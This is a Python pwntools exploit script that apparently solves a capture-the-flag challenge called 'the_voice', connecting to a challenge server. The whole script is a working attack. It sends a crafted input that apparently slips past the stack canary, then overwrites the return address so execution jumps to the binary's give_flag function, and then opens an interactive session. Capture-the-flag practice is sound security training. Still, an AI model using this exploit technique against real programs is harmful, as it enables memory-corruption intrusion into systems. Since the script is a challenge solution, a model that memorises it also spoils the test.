#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' the_voice
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'the_voice')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
# nc challs.umdctf.io 31192
host = args.HOST or 'challs.umdctf.io'
port = int(args.PORT or 31192)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+114
b *main+126
continue
canary
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(b"If you want the flag, command me to give it to you.\n")

# index 1 = -0x738 bytes
# index 0 = -0x730 bytes
# io.sendline(str(0).encode())
p = b"15."
p+= cyclic(21)
p+= p64(10191)
p+= cyclic(8)
p+= p64(exe.sym["give_flag"])

io.sendline(p)
io.interactive()

